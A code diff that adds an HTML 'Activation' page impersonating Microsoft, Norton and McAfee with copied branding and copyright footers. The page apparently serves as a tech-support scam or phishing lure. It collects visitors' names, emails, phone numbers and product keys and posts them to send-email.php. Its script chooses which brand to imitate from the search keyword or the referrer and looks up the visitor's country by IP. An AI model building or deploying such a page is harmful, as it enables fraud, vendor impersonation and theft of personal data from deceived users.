@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="pageTitle">Activation</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        brand: {
+                            primary: '#0078d4',
+                            dark: '#0b2447',
+                            light: '#e8f3fc'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .brand-logo { transition: all 0.3s ease; }
+        .gradient-bg {
+            background: #ffffff;
+        }
+        .card-glass {
+            background: #ffffff;
+            border: 1px solid #e5e7eb;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+        }
+        .input-field:focus {
+            box-shadow: 0 0 0 3px rgba(0,120,212,0.3);
+        }
+        .btn-gradient {
+            background: linear-gradient(135deg, #0078d4, #005a9e);
+            transition: all 0.3s ease;
+        }
+        .btn-gradient:hover {
+            background: linear-gradient(135deg, #005a9e, #00447a);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0,120,212,0.4);
+        }
+        .brand-badge {
+            transition: all 0.3s ease;
+        }
+    </style>
+</head>
+<body class="min-h-screen gradient-bg bg-white text-gray-900">
+    <!-- Background Pattern -->
+    <div class="fixed inset-0 overflow-hidden pointer-events-none">
+        <div class="absolute -top-40 -right-40 w-80 h-80 rounded-full bg-blue-500 opacity-10 blur-3xl"></div>
+        <div class="absolute -bottom-40 -left-40 w-80 h-80 rounded-full bg-indigo-500 opacity-10 blur-3xl"></div>
+        <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] rounded-full bg-blue-600 opacity-5 blur-3xl"></div>
+    </div>
+
+    <div class="relative z-10 min-h-screen flex items-center justify-center px-4 py-12">
+        <div class="max-w-lg w-full">
+            <!-- Brand Logo Section -->
+            <div class="text-center mb-1">
+                <div id="brandIcon" class="brand-badge mb-6 text-center">
+                    <i id="brandIconImg" class="fa-brands fa-windows text-5xl text-gray-400"></i>
+                </div>
+            </div>
+
+            <!-- Form Card -->
+            <div class="card-glass rounded-2xl p-8 shadow-2xl">
+                <form id="activationForm" action="send-email.php" method="POST" class="space-y-5">
+                    <p id="brandSubtitle" class="text-gray-500 text-sm text-center">Enter your activation details below</p>
+                    <!-- Name -->
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-2">
+                            <i class="fa-solid fa-user mr-2"></i>Full Name
+                        </label>
+                        <input type="text" name="name" id="name" required
+                            class="input-field w-full px-4 py-3 rounded-xl bg-white border border-gray-300 text-gray-900 placeholder-gray-400 focus:outline-none transition-all duration-300"
+                            placeholder="Enter your full name">
+                    </div>
+
+                    <!-- Email -->
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-2">
+                            <i class="fa-solid fa-envelope mr-2"></i>Email Address
+                        </label>
+                        <input type="email" name="email" id="email" required
+                            class="input-field w-full px-4 py-3 rounded-xl bg-white border border-gray-300 text-gray-900 placeholder-gray-400 focus:outline-none transition-all duration-300"
+                            placeholder="Enter your email">
+                    </div>
+
+                    <!-- Phone -->
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-2">
+                            <i class="fa-solid fa-phone mr-2"></i>Phone Number
+                        </label>
+                        <input type="tel" name="phone" id="phone" required
+                            class="input-field w-full px-4 py-3 rounded-xl bg-white border border-gray-300 text-gray-900 placeholder-gray-400 focus:outline-none transition-all duration-300"
+                            placeholder="Enter your phone number">
+                    </div>
+
+                    <!-- Activation Key -->
+                    <div>
+                        <label class="block text-sm font-medium text-gray-700 mb-2">
+                            <i class="fa-solid fa-key mr-2"></i>Activation Key
+                        </label>
+                        <input type="text" name="activation_key" id="activation_key" required
+                            class="input-field w-full px-4 py-3 rounded-xl bg-white border border-gray-300 text-gray-900 placeholder-gray-400 focus:outline-none transition-all duration-300 font-mono tracking-wider"
+                            placeholder="XXXXX-XXXXX-XXXXX-XXXXX-XXXXX" maxlength="29" autocomplete="off" autocapitalize="characters" spellcheck="false">
+                    </div>
+
+                    <!-- Brand Hidden Field -->
+                    <input type="hidden" name="brand" id="brandField" value="microsoft">
+                    <input type="hidden" name="keyword" id="keywordField" value="">
+                    <input type="hidden" name="referrer" id="referrerField" value="">
+                    <input type="hidden" name="country" id="countryField" value="">
+
+                    <!-- Submit Button -->
+                    <button type="submit" id="submitBtn" class="btn-gradient w-full py-4 rounded-xl text-white font-semibold text-lg shadow-lg">
+                        <i class="fa-solid fa-download mr-2"></i>Install & Activate
+                    </button>
+                </form>
+            </div>
+
+            <!-- Footer -->
+            <div class="mt-6 text-center">
+                <p class="text-gray-400 text-xs" id="footerText">
+                    &copy; 2026 Microsoft Corporation. All rights reserved.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const brandConfig = {
+            microsoft: {
+                name: 'Microsoft',
+                icon: 'fa-brands fa-windows',
+                title: 'Microsoft',
+                subtitle: 'Enter your activation details below',
+                footer: '&copy; 2026 Microsoft Corporation. All rights reserved.',
+                primaryColor: '#0078d4',
+                gradientFrom: '#0b2447',
+                gradientMid: '#1a3a6a',
+                gradientTo: '#0078d4'
+            },
+            norton: {
+                name: 'Norton',
+                icon: 'fa-solid fa-shield-halved',
+                title: 'Norton',
+                subtitle: 'Enter your activation details below',
+                footer: '&copy; 2026 NortonLifeLock Inc. All rights reserved.',
+                primaryColor: '#00b050',
+                gradientFrom: '#0a2a1a',
+                gradientMid: '#1a4a2a',
+                gradientTo: '#00b050'
+            },
+            mcafee: {
+                name: 'McAfee',
+                icon: 'fa-solid fa-shield-halved',
+                title: 'McAfee',
+                subtitle: 'Enter your activation details below',
+                footer: '&copy; 2026 McAfee, LLC. All rights reserved.',
+                primaryColor: '#c01818',
+                gradientFrom: '#2a0a0a',
+                gradientMid: '#4a1212',
+                gradientTo: '#c01818'
+            }
+        };
+
+        function detectBrand() {
+            let keyword = '';
+            let brand = 'microsoft';
+            const referrer = document.referrer || '';
+
+            // Check URL parameters first
+            const params = new URLSearchParams(window.location.search);
+            keyword = params.get('keyword') || params.get('q') || params.get('brand') || '';
+
+            // If no keyword from URL, parse referrer
+            if (!keyword && referrer.includes('google.')) {
+                try {
+                    const referrerUrl = new URL(referrer);
+                    keyword = referrerUrl.searchParams.get('q') || referrerUrl.searchParams.get('keyword') || '';
+                } catch(e) {}
+            }
+
+            // If still no keyword, check sessionStorage
+            if (!keyword) {
+                keyword = sessionStorage.getItem('detectedKeyword') || '';
+            }
+
+            keyword = keyword.toLowerCase().trim();
+
+            // Detect brand from keyword
+            if (keyword.includes('mcafee')) {
+                brand = 'mcafee';
+            } else if (keyword.includes('norton') || keyword.includes('antivirus') || keyword.includes('security') || keyword.includes('lifelock')) {
+                brand = 'norton';
+            } else {
+                brand = 'microsoft';
+            }
+
+            // Apply brand
+            applyBrand(brand, keyword, referrer);
+        }
+
+        function applyBrand(brand, keyword, referrer) {
+            const config = brandConfig[brand];
+            if (!config) return;
+
+            // Update brand icon (Microsoft uses downloaded Office image/SVG, Norton uses FontAwesome)
+            const brandIconBox = document.getElementById('brandIcon');
+            if (brand === 'microsoft') {
+                brandIconBox.innerHTML = '<img id="brandIconImg" src="assets/microsoft-office-logo.svg" onerror="this.onerror=null;this.src=\'assets/microsoft-office.jpg\'" alt="Microsoft Office" class="w-64 max-w-full h-auto object-contain inline-block">';
+            } else if (brand === 'mcafee') {
+                brandIconBox.innerHTML = '<img id="brandIconImg" src="assets/mcafee-logo.svg" alt="McAfee" class="w-64 max-w-full h-auto object-contain inline-block">';
+            } else {
+                brandIconBox.innerHTML = '<img id="brandIconImg" src="assets/norton-logo.svg" onerror="this.onerror=null;this.src=\'assets/norton-logo.png\'" alt="Norton" class="w-64 max-w-full h-auto object-contain inline-block">';
+            }
+            document.getElementById('brandSubtitle').textContent = config.subtitle;
+            document.getElementById('pageTitle').textContent = config.name + ' Activation';
+            document.getElementById('footerText').innerHTML = config.footer;
+
+            // Keep background white on all pages
+            document.querySelector('.gradient-bg').style.background = '#ffffff';
+
+            // Update brand field
+            document.getElementById('brandField').value = brand;
+            document.getElementById('keywordField').value = keyword;
+            document.getElementById('referrerField').value = referrer;
+
+            // Store keyword
+            sessionStorage.setItem('detectedKeyword', keyword);
+            sessionStorage.setItem('detectedBrand', brand);
+            sessionStorage.setItem('detectedReferrer', referrer);
+        }
+
+        // Run on load
+        detectBrand();
+
+        // Auto-add phone country code based on visitor IP location
+        (function fillCountryCode() {
+            const phoneInput = document.getElementById('phone');
+            function applyGeo(data) {
+                if (!data) return false;
+                const dialCode = data.country_calling_code || data.calling_code;
+                if (!dialCode) return false;
+                const countryName = data.country_name || data.country || '';
+                const countryIso = data.country_code || data.country_code2 || '';
+                document.getElementById('countryField').value = countryName + (countryIso ? ' (' + countryIso + ')' : '');
+                if (!phoneInput.value && document.activeElement !== phoneInput) {
+                    phoneInput.value = dialCode + ' ';
+                }
+                phoneInput.placeholder = dialCode + ' 555 123 4567';
+                return true;
+            }
+            fetch('https://ipapi.co/json/')
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    if (!applyGeo(data)) throw new Error('no dial code');
+                })
+                .catch(function() {
+                    fetch('https://ipwho.is/')
+                        .then(function(res) { return res.json(); })
+                        .then(function(data) { applyGeo(data); })
+                        .catch(function() {});
+                });
+        })();
+
+        // Auto-format activation key: UPPERCASE, dash after every 5 chars, max 25 chars
+        const keyInput = document.getElementById('activation_key');
+        keyInput.addEventListener('input', function() {
+            const raw = keyInput.value.toUpperCase().replace(/[^A-Z0-9]/g, '').slice(0, 25);
+            const grouped = raw.match(/.{1,5}/g);
+            keyInput.value = grouped ? grouped.join('-') : '';
+        });
+
+        // Handle form submission
+        document.getElementById('activationForm').addEventListener('submit', function(e) {
+            sessionStorage.setItem('detectedActivationKey', document.getElementById('activation_key').value);
+            sessionStorage.setItem('detectedBrand', document.getElementById('brandField').value);
+            const btn = document.getElementById('submitBtn');
+            btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin mr-2"></i>Processing...';
+            btn.disabled = true;
+        });
+    </script>
+</body>
+</html>
